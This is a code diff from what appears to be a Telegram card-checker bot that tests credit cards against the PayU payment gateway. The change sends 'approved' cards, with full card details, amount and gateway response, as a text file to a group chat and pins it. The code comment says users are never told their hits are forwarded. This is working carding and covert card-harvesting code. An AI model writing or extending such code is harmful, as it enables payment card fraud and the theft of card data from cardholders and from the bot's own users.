@@ -285,13 +285,35 @@ async def process_pu_check(message, proc_msg, user, user_id, formatted_cc, cc, p
     )
 
     # silent group log + pin (user is never told their hit was forwarded)
-    if status_raw in ("charged", "approved"):
+    if status_raw == "charged":
+        # CHARGED -> hit card as-is (with user identity), pinned
         try:
             sent = await send_hit(message.bot, PAYU_GROUP_ID, final_caption, None)
             if sent is not None:
                 await message.bot.pin_chat_message(chat_id=PAYU_GROUP_ID, message_id=sent.message_id)
         except Exception as e:
             logging.warning(f"[PU] group log failed: {e}")
+    elif status_raw == "approved":
+        # APPROVED -> text file, anonymous (no user identity), pinned
+        try:
+            approved_text = (
+                f"Card: {formatted_cc}\n"
+                f"Gateway: PayU\n"
+                f"Amount: {amt} PLN\n"
+                f"Response: {res_code}\n"
+                f"Real Response: {real_resp}\n"
+            )
+            document = types.BufferedInputFile(
+                file=approved_text.encode("utf-8"),
+                filename=f"approved_{formatted_cc[:6]}.txt")
+            sent = await message.bot.send_document(
+                chat_id=PAYU_GROUP_ID, document=document,
+                caption=f"{APPROVED_EMOJI} <b>𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 𝐏𝐚𝐲𝐔</b> — {amt} PLN",
+                parse_mode="HTML")
+            if sent is not None:
+                await message.bot.pin_chat_message(chat_id=PAYU_GROUP_ID, message_id=sent.message_id)
+        except Exception as e:
+            logging.warning(f"[PU] approved file log failed: {e}")
 
     try:
         await proc_msg.edit_text(final_caption, parse_mode="HTML", disable_web_page_preview=True)
